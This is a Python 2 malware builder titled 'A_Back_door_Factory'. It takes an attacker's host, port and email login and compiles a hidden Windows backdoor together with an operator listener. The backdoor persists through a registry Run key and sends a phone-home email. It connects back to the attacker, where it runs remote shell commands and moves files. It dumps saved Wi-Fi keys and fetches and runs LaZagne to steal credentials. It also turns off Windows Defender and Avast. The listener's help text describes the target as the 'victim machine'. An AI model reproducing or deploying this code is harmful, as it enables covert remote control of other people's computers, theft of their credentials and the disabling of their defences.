import shutil
import sys
import os
import subprocess

subprocess.call('cls', shell=True)
welcome='''
########################################################################################################################
###                                          Welcome to A_Back_door_Factory                                          ###
#####                                                                                                              #####
#######                                             BY:Ali A.Falih                                               #######
#####                                                                                                              #####
###                                          Email:Alifalih783783@gmail.com                                          ###
########################################################################################################################
'''
print(welcome+"\n")
if os.path.exists('c:\Python27'):
    print("[+] Python2.7 detected.")
    if os.path.exists('c:\Python27\Scripts\pyinstaller.exe'):
        print("[+] pyinstaller detected.")
        subprocess.call('cls', shell=True)
    else:
        print("[-] No pyinstaller detected.")
        print("Downloading and installing pyinstaller. please wait....")
        try:
            subprocess.call('c:\Python27\python.exe -m pip install pyinstaller', shell=True)
        except:
            print ('[-] Faild to connect to the internet .')
            exx=str(raw_input('Press Enter to exit and try again after connecting to the internet.'))
            sys.exit()
        print("[+] pyinstaller has been installed successfully.")
        subprocess.call('cls', shell=True)

else:
    print("[-] No Python2.7 detected.")
    print("installing python2.7 and Pyinstaller. please wait....")
    ccwwdd=sys.executable
    ccwwdd=ccwwdd.replace("A_Back_door_Factory.exe","")
    shutil.copytree(ccwwdd+'Python27','C:\Python27',symlinks=False,ignore=None)
    print("[+] Python2.7 has been installed successfully.")
    subprocess.call('cls', shell=True)

print(welcome+"\n\n")

try:
    LHOST=str(raw_input('Enter the LHOST :'))
    LPORT=str(raw_input('Enter the LPORT :'))
    quitpass=str(raw_input('Enter the quitting password :'))
    email=str(raw_input('Enter the email :'))
    password=str(raw_input('Enter the email password:'))
    icon=str(raw_input('Enter the path to the icon.ico :'))
except KeyboardInterrupt:
    print ('[+] Ctrl + C detected . Rolling back....')
    sys.exit()

code1="""import socket
import subprocess
import os
import json
import sys
import base64
import shutil
import tempfile
import time
import requests
import re
import zipfile
import io
import smtplib

def startup():
    klogger_loc=tempfile.gettempdir()
    klogger_loc+="\Windows files_vimp.exe"
    if not os.path.exists(klogger_loc):
        shutil.copyfile(sys.executable,klogger_loc)
        DEVNULL = open(os.devnull, 'wb')
        subprocess.check_output('reg add HKCU\Software\Microsoft\Windows\currentVersion\Run /v windata /t REG_SZ /d "' + klogger_loc + '"',shell=True , stderr=DEVNULL, stdin=DEVNULL)

def send_email(email,password,msg):
    server=smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,msg)
    server.quit()

def req_connection():
    try:
        connection.connect(('"""+LHOST+"""',"""+LPORT+"""))
    except:
        req_connection()

    

def reliable_send(data):
    json_data=json.dumps(data)
    connection.send(json_data)

def reliable_receive():
    json_data=""
    while True:
	try:
	    json_data = json_data+connection.recv(1024)
            return json.loads(json_data)
	except ValueError:
            continue

def download_from(url,to):
    respownse=requests.get(url)
    cwd=os.getcwd()
    if to=="":
        to=cwd
    os.chdir(to)
    file_name=str(url).split('/')[-1]
    with open (file_name,"wb") as out_file :
        out_file.write(respownse.content)
        out_file.close()
    os.chdir(cwd)
    
def DownloadFile(url,lazrd_loc):
    r = requests.get(url, stream=True)
    check = zipfile.is_zipfile(io.BytesIO(r.content))
    while not check:
        r = requests.get(url, stream=True)
        check = zipfile.is_zipfile(io.BytesIO(r.content))
    else:
        z = zipfile.ZipFile(io.BytesIO(r.content))
        z.extractall(lazrd_loc)

def get_networks():
    DEVNULL = open(os.devnull, 'wb')
    netsh_output=subprocess.check_output(['netsh', 'wlan', 'show', 'profile'],stderr=DEVNULL,stdin=DEVNULL)
    networks_list=re.findall('(?:Profile\s*:\s)(.*)',netsh_output)
    msg=''
    for network in networks_list :
        comand='netsh wlan show profile '
        comand+=network
        comand+=' key=clear'
        msg+='''\\n\\n#########################################################\\n####################'''+network+'''#########################################################\\n\\n'''
        DEVNULL = open(os.devnull, 'wb')
        pass_com_out=subprocess.check_output(comand,shell=True,stderr=DEVNULL,stdin=DEVNULL)
        ssid=re.search('SSID name.*',pass_com_out)
        password=re.search('Key Content.*',pass_com_out)
        try:
        	msg+=ssid.group(0)+'\\n'+password.group(0)
        except:
        	print("")
    reliable_send(msg)
    
def downloaddir(command):
   
    ddffn = str(command).split(' ')[1]
    dc = 2
    while True:
        try:
            ddffn += " " + str(command).split(' ')[dc]
            dc += 1
        except:
            break
    cswsd=os.getcwd()
    if os.path.exists(cswsd+"\\\\"+ddffn):
        tdp=tempfile.gettempdir()
        ddffn2=ddffn.replace(" ","_")
        if os.path.exists(tdp+"\\\\"+ddffn2):
            os.chdir(tdp)
            os.system('del '+ddffn2)
            os.chdir(cswsd)
        shutil.make_archive(tdp+"\\\\"+ddffn2,'zip',ddffn)
        os.chdir(tdp)
        os.rename(ddffn2+'.zip',ddffn2+'.txt')
        os.chdir(cswsd)
        reliable_send(tdp+"\\\\"+ddffn2+'.txt'+"///"+cswsd)
    else:
        reliable_send("Can't find ("+ddffn+")")
    
        
    
       
def ex_command(com):
    if (str(com)=='"""+quitpass+"""'):
        sys.exit()
    
    elif (str(com)=='wipass'):
        get_networks()
        
    elif (str(com).split(' ')[0]=='download'):
        ddffn=str(com).split(' ')[1]
        dc=2
        while True:
            try:
                ddffn+=" "+str(com).split(' ')[dc]
                dc+=1
            except:
                break
        try:   
            dfile= open (ddffn,'rb')
            dataa=dfile.read()
            reliable_send(base64.b64encode(dataa))
            dfile.close()
            
        except:
            reliable_send(base64.b64encode("[-] Can't find ("+ddffn+")"))
    elif (str(com).split(' ')[0]=='downloaddir') :
        downloaddir(com)
        
    elif (str(com).split(' ')[0]=='upload') :
        reliable_send('ok')
        upfilecont64=reliable_receive()
        if upfilecont64=='timeout':
            reliable_send("[-] Upload failed")
        else:
            upfilecont=base64.b64decode(upfilecont64)
            srcup=str(com).split(' ')[1]
            dstup=str(com).split(' ')[2]
            pc=3
            while True:
                try:
                    dstup +=" "+str(com).split(' ')[pc]
                    pc+=1
                except:
                    break
            ccwwdd=os.getcwd()
            upfn=srcup.split("/")[-1]
            os.chdir(dstup)
            with open(upfn,'wb') as upfile:
                upfile.write(str(upfilecont))
                upfile.close()
            os.chdir(ccwwdd)
            reliable_send("[+] ("+upfn+") has been Uploaded successfully.")
        
    elif (str(com)=='exi'):
        reliable_send('[-] Exitting connection...')
        connection.close()
        
    elif (str(com)=='lazagne'):
        tdp=tempfile.gettempdir()
        download_from("https://github.com/AlessandroZ/LaZagne/releases/download/2.4/laZagne.exe",tdp)
        DEVNULL = open(os.devnull, 'wb')
        lazagne_output=subprocess.check_output(tdp+'\\lazagne.exe all',shell=True,stderr=DEVNULL,stdin=DEVNULL)
        reliable_send(lazagne_output)
        os.system('del '+tdp+"\laZagne.exe")

    elif (str(com)=='lazagne wd'):
        os.system('powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true')
        tdp=tempfile.gettempdir()
        download_from("https://github.com/AlessandroZ/LaZagne/releases/download/2.4/laZagne.exe",tdp)
        DEVNULL = open(os.devnull, 'wb')
        lazagne_output=subprocess.check_output(tdp+'\\lazagne.exe all',shell=True,stderr=DEVNULL,stdin=DEVNULL)
        reliable_send(lazagne_output)
        os.system('del '+tdp+"\laZagne.exe")
        os.system('powershell.exe Set-MpPreference -DisableRealtimeMonitoring $false')

    elif (str(com)=='lazagne avast'):
        os.system('''net stop "Avast Antivirus"''')
        tdp=tempfile.gettempdir()
        download_from("https://github.com/AlessandroZ/LaZagne/releases/download/2.4/laZagne.exe",tdp)
        DEVNULL = open(os.devnull, 'wb')
        lazagne_output=subprocess.check_output(tdp+'\\lazagne.exe all',shell=True,stderr=DEVNULL,stdin=DEVNULL)
        reliable_send(lazagne_output)
        os.system('del '+tdp+"\laZagne.exe")
        os.system('''net stop "Avast Antivirus"''')

    elif (str(com)=='kill wd'):
        os.system('REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
        os.system('powershell.exe Set-MpPreference -DisableRealtimeMonitoring $false')
        reliable_send('[+] Windows Defender has been disabled successfuly.')

    elif (str(com)=='revive wd'):
        os.system('powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true')
        os.system('Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 0 /f')
        reliable_send('[+] Windows Defender has been enabled successfuly.')
        
    elif (str(com)=='reset'):
	pass
    
    elif (str(com)=="ycwd"):
        mcwd=os.getcwd()
        reliable_send(mcwd)

    elif (str(com).split(' ')[0]=='downloadurl-zip'):
        ccwwddd=os.getcwd()
        try:
            reliable_send('[+] Downloading the the file from -> '+str(com).split(' ')[1])
            DownloadFile(str(com).split(' ')[1],ccwwddd)
            reliable_send('[+] The file has been downloaded successfuly.')
        except:
            reliable_send('[-] Invalid url')
            
    elif (str(com).split(' ')[0]=='downloadurl'):
        ccwwddd=os.getcwd()
        try:
            reliable_send('[+] Downloading the the file from -> '+str(com).split(' ')[1])
            download_from(str(com).split(' ')[1],ccwwddd)
            reliable_send('[+] The file has been downloaded successfuly.')
        except:
            reliable_send('[-] Invalid url')
            
       
    elif str(com).split(' ')[0]=="sys":
	try:
                        
	    sys_command=""
	    x=1           
	    if str(com).split(' ')[1]=="cd":
                x=2
	    if str(com).split(' ')[1]=="info":
		pass
	    
	    while True:
		try:
		    sys_command+=str(com).split(" ")[x]
		    sys_command+=" "
		    x+=1
		except:
		    break
	    if str(com).split(' ')[1]=="cd":
                try:
                    if str(com).split(' ')[2]=="..":
                        cwd2=str(os.getcwd())
                        cwdl='\\\\'+cwd2.split('\\\\')[-1]
                        cwd3=cwd2.replace(cwdl,'')
                        os.chdir(cwd3)
                        reliable_send('')
                    else:
                        os.chdir(sys_command)
                        out_put="cd done"
                        reliable_send(out_put)
                except:
                    rereliable_send('No such file or directory.')
	    else:
		DEVNULL = open(os.devnull, 'wb')
		out_put=subprocess.check_output(sys_command,shell=True,stderr=DEVNULL,stdin=DEVNULL)
		reliable_send("\\n"+str(out_put)+'\\n')
	except:
	    reliable_send('\\nNo such command('+sys_command+")")
    else:
	reliable_send('\\nNo such command ('+com+")")

startup()
send_email('"""+email+"""','"""+password+"""','Back door\\n\\n\\nBackdoor is online')

while True:
    try:
        connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        req_connection()
        reliable_receive()
        con_state=True
        while con_state :
            recieved_comand=""
            cwd=os.getcwd()
            reliable_send('\\n'+str(cwd))
            recieved_comand=reliable_receive()
            ex_command(str(recieved_comand))
            if str(recieved_comand)=='exi':
                con_state=False
    except socket.error:
        continue
    except TypeError:
        reliable_send('[-] Incorrect padding')
        continue

"""
cwd=sys.executable
cwd=cwd.replace("\\A_Back_door_Factory.exe","")
if os.path.exists(cwd+"\\pycode"):
    shutil.rmtree(cwd+"\\pycode")
os.mkdir(cwd+"\\pycode")
os.chdir(cwd+"\\pycode")
with open('pycode.py','w')as outfile:
    outfile.write(code1)
    outfile.close()
if icon=="":
    icon=cwd+'\\icon\\bd.ico'
print('\nPlease wait while creating your A_Back_door.')
DEVNULL = open(os.devnull, 'wb')
subprocess.check_output('''C:\Python27\Scripts\pyinstaller.exe pycode.py --onefile --noconsole --icon "'''+icon+'''"''', shell=True,stderr=DEVNULL,stdin=DEVNULL)
desktop=os.path.expanduser("~/desktop")
shutil.copyfile(cwd+"\\pycode\\dist\\pycode.exe",desktop+'\\A_back_door.exe')
os.chdir(cwd)
shutil.rmtree(cwd+"\\pycode")


code2="""#! usr/env/bin python
import socket
import json
import sys
import os
import base64
import time




def reliable_send(data):
    json_data = json.dumps(data)
    connection.send(json_data)


def reliable_receive():
    json_data = ""
    while True:
        try:
            json_data = json_data + str(connection.recv(1024))
            return json.loads(json_data)
        except (ValueError):
            continue


def reliable_doreceive():
    json_data = ""
    connection.settimeout(100)
    while True:
        try:
            json_data = json_data + str(connection.recv(1024))
            return json.loads(json_data)
        except (ValueError):
            continue
        except socket.timeout:
            return "[-] Request timeout, press Enter and try again."


def download(command):
    ddffn = str(command).split(' ')[1]
    dc = 2
    while True:
        try:
            ddffn += " " + str(command).split(' ')[dc]
            dc += 1
        except:
            break
    try:
        reliable_send(command)
        print('[+] downloading (' + ddffn + ") please wait....")
        dfo = reliable_doreceive()
        if dfo == "[-] Request timeout, press Enter and try again.":
            xxx = 20
            while xxx > 0:
                if dfo == "[-] Request timeout, press Enter and try again.":
                    time.sleep(1)
                    reliable_send(command)
                    dfo = reliable_doreceive()
                    xxx -= 1
                else:
                    break
        print('[+] (' + ddffn + ') has been downloaded successfuly.')
        ccwwdd = os.getcwd()
        os.chdir('/root/Downloads')
        dfile = open(ddffn, 'wb')
        dfile.write(base64.b64decode(dfo))
        dfile.close()
        os.chdir(str(ccwwdd))
    except:
        if base64.b64decode(dfo) == "[-] Can't fint (" + ddffn + ")":
            print("[-] Can't fint (" + ddffn + ")")

def upload(command):
    srcup = str(command).split(' ')[1]
    dstup = str(command).split(' ')[2]
    reliable_send(command)
    ok = reliable_receive()
    if ok == 'ok':
        ccwwdd = os.getcwd()
        upfn = srcup.split("/")[-1]
        srcup = srcup.replace(upfn, "")
        os.chdir(srcup)
        upfile = open(upfn, 'rb')
        upfilecont = upfile.read()
        reliable_send(base64.b64encode(upfilecont))
        os.chdir(ccwwdd)
        upst = reliable_receive()
        print(upst)
    else:
        print('[-] Request timeout.')

def fol2zip2txt(command):
    reliable_send(command)
    zfnt=reliable_receive()
    return zfnt




try:
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind(('"""+LHOST+"""', """+LPORT+"""))
    listener.listen(0)
    print('[+] waiting for incoming connection.... ')
    connection, address = listener.accept()
    print('[+] connection established with --> ' + str(address))
    reliable_send("start")
    while True:
        recieved_cwd = reliable_receive()
        print(recieved_cwd+">"),
        zzzz=recieved_cwd
        command = str(raw_input(''))
        if (command == ""):
            reliable_send('reset')
        elif (command == 'sys help'):
            print('''
    For more information on a specific command, type HELP command-name
    ASSOC          Displays or modifies file extension associations.
    ATTRIB         Displays or changes file attributes.
    BREAK          Sets or clears extended CTRL+C checking.
    BCDEDIT        Sets properties in boot database to control boot loading.
    CACLS          Displays or modifies access control lists (ACLs) of files.
    CALL           Calls one batch program from another.
    CD             Displays the name of or changes the current directory.
    CHCP           Displays or sets the active code page number.
    CHDIR          Displays the name of or changes the current directory.
    CHKDSK         Checks a disk and displays a status report.
    CHKNTFS        Displays or modifies the checking of disk at boot time.
    CLS            Clears the screen.
    CMD            Starts a new instance of the Windows command interpreter.
    COLOR          Sets the default console foreground and background colors.
    COMP           Compares the contents of two files or sets of files.
    COMPACT        Displays or alters the compression of files on NTFS partitions.
    CONVERT        Converts FAT volumes to NTFS.  You cannot convert the
                   current drive.
    COPY           Copies one or more files to another location.
    DATE           Displays or sets the date.
    DEL            Deletes one or more files.
    DIR            Displays a list of files and subdirectories in a directory.
    DISKPART       Displays or configures Disk Partition properties.
    DOSKEY         Edits command lines, recalls Windows commands, and
                   creates macros.
    DRIVERQUERY    Displays current device driver status and properties.
    ECHO           Displays messages, or turns command echoing on or off.
    ENDLOCAL       Ends localization of environment changes in a batch file.
    ERASE          Deletes one or more files.
    EXIT           Quits the CMD.EXE program (command interpreter).
    FC             Compares two files or sets of files, and displays the
                   differences between them.
    FIND           Searches for a text string in a file or files.
    FINDSTR        Searches for strings in files.
    FOR            Runs a specified command for each file in a set of files.
    FORMAT         Formats a disk for use with Windows.
    FSUTIL         Displays or configures the file system properties.
    FTYPE          Displays or modifies file types used in file extension
                   associations.
    GOTO           Directs the Windows command interpreter to a labeled line in
                   a batch program.
    GPRESULT       Displays Group Policy information for machine or user.
    GRAFTABL       Enables Windows to display an extended character set in
                   graphics mode.
    HELP           Provides Help information for Windows commands.
    ICACLS         Display, modify, backup, or restore ACLs for files and
                   directories.
    IF             Performs conditional processing in batch programs.
    LABEL          Creates, changes, or deletes the volume label of a disk.
    MD             Creates a directory.
    MKDIR          Creates a directory.
    MKLINK         Creates Symbolic Links and Hard Links
    MODE           Configures a system device.
    MORE           Displays output one screen at a time.
    MOVE           Moves one or more files from one directory to another
                   directory.
    OPENFILES      Displays files opened by remote users for a file share.
    PATH           Displays or sets a search path for executable files.
    PAUSE          Suspends processing of a batch file and displays a message.
    POPD           Restores the previous value of the current directory saved by
                   PUSHD.
    PRINT          Prints a text file.
    PROMPT         Changes the Windows command prompt.
    PUSHD          Saves the current directory then changes it.
    RD             Removes a directory.
    RECOVER        Recovers readable information from a bad or defective disk.
    REM            Records comments (remarks) in batch files or CONFIG.SYS.
    REN            Renames a file or files.
    RENAME         Renames a file or files.
    REPLACE        Replaces files.
    RMDIR          Removes a directory.
    ROBOCOPY       Advanced utility to copy files and directory trees
    SET            Displays, sets, or removes Windows environment variables.
    SETLOCAL       Begins localization of environment changes in a batch file.
    SC             Displays or configures services (background processes).
    SCHTASKS       Schedules commands and programs to run on a computer.
    SHIFT          Shifts the position of replaceable parameters in batch files.
    SHUTDOWN       Allows proper local or remote shutdown of machine.
    SORT           Sorts input.
    START          Starts a separate window to run a specified program or command.
    SUBST          Associates a path with a drive letter.
    SYSTEMINFO     Displays machine specific properties and configuration.
    TASKLIST       Displays all currently running tasks including services.
    TASKKILL       Kill or stop a running process or application.
    TIME           Displays or sets the system time.
    TITLE          Sets the window title for a CMD.EXE session.
    TREE           Graphically displays the directory structure of a drive or
                   path.
    TYPE           Displays the contents of a text file.
    VER            Displays the Windows version.
    VERIFY         Tells Windows whether to verify that your files are written
                   correctly to a disk.
    VOL            Displays a disk volume label and serial number.
    XCOPY          Copies files and directory trees.
    WMIC           Displays WMI information inside interactive command shell.
    
    For more information on tools see the command-line reference in the online help.''')
            reliable_send('reset')
        elif (command == 'help'):
            print('''
            help                    to show that help menu.
            download                to download a file from the victim machine.
            downloaddir             to download a directory from the victim machine.
            downloadurl             to download a file from a url to the victim machine.
            downloadurl-zip         to download and extract a zip-file from a url to the victim machine.
            upload                  to upload a file to the victim machine.
            exi/Ctrl+c              to exit the listener without shutting down the back door.
            ((quit password))       to exit the listener and shut down the back door.
            wipass                  to get the wifi passwords.
            lazagne                 to use lazagne.(windows without AV).
            lazagne wd              to use lazagne.(windows with windows defender)(Admin-privileges required).
            lazagne avast           to use lazagne.(windows with avast)(Admin-privileges required)(victim should accept).
            kill wd                 to kill the windows defender.
            revive wd               to revive the windows defender.
            
            ''')
            reliable_send('reset')
        
        elif (str(command).split(' ')[0] == 'download'):
            download(command)
        elif (str(command).split(' ')[0] == 'upload'):
            upload(command)
        elif (str(command).split(' ')[0] == 'downloaddir'):
            ddffn = str(command).split(' ')[1]
            dc = 2
            while True:
                try:
                    ddffn += " " + str(command).split(' ')[dc]
                    dc += 1
                except:
                    break
            zfntphcwd=fol2zip2txt(command)
            zfnt=str(zfntphcwd).split("///")[0]
            hcwd=str(zfntphcwd).split("///")[1]
            tfn=str(zfnt).split("\\\\")[-1]
            tfn2=tfn
            if zfnt=="Can't find ("+ddffn+")":
                print('[-] '+zfnt)
            else:
                try:
                    tdp=zfnt.replace("\\\\"+tfn,"")
                    reliable_send("sys cd "+tdp)
                    nun1=reliable_receive()
                    download('download '+tfn)
                    reliable_send("sys del " + tfn)
                    nun2= reliable_receive()
                    reliable_send("sys cd " + hcwd)
                    nun55 = reliable_receive()
                    cwwdd = os.getcwd()
                    os.chdir('/root/Downloads')
                    zfn = tfn.replace(".txt", ".zip")
                    os.rename(tfn, zfn)
                    os.chdir(cwwdd)



                except:
                    print("[-] Error while downloading the folder. rolling back....")
                    tdp = zfnt.replace("\\\\" + tfn2, "")
                    reliable_send("sys cd " + tdp)
                    nun1 = reliable_receive()
                    reliable_send("sys del " + tfn2)
                    nun2 = reliable_receive()
                    print("[+] done...")


        elif (str(command).split(' ')[0] == 'downloadurl' or str(command).split(' ')[0] == 'downloadurl-zip'):
            reliable_send(command)
            command_result = reliable_receive()
            print(command_result)
            command_result = reliable_receive()
            print(command_result)

        else:
            reliable_send(command)
            command_result = reliable_receive()
            print(command_result)
            if command == "exi" or command == '"""+quitpass+"""':
                sys.exit()


except KeyboardInterrupt:
    reliable_send('exi')
    command_result = reliable_receive()
    print('[+] Ctrl+C detected , exiting....')
    sys.exit()


except:
    reliable_send('exi')
    command_result = reliable_receive()
    print('[+] Error detected , exiting to protect the connection....')
    sys.exit()
"""

cwd=sys.executable
cwd=cwd.replace("\\A_Back_door_Factory.exe","")
if os.path.exists(cwd+"\\pycode"):
    shutil.rmtree(cwd+"\\pycode")
os.mkdir(cwd+"\\pycode")
os.chdir(cwd+"\\pycode")
with open('pycode.py','w')as outfile:
    outfile.write(code2)
    outfile.close()
desktop=os.path.expanduser("~/desktop")
shutil.copyfile(cwd+"\\pycode\\pycode.py",desktop+'\\Listener.py')
os.chdir(cwd)
shutil.rmtree(cwd+"\\pycode")

print('\n\n[+] Done setting up your A_Back_door. Press Enter to exit.')
ex=str(raw_input(''))
sys.exit()
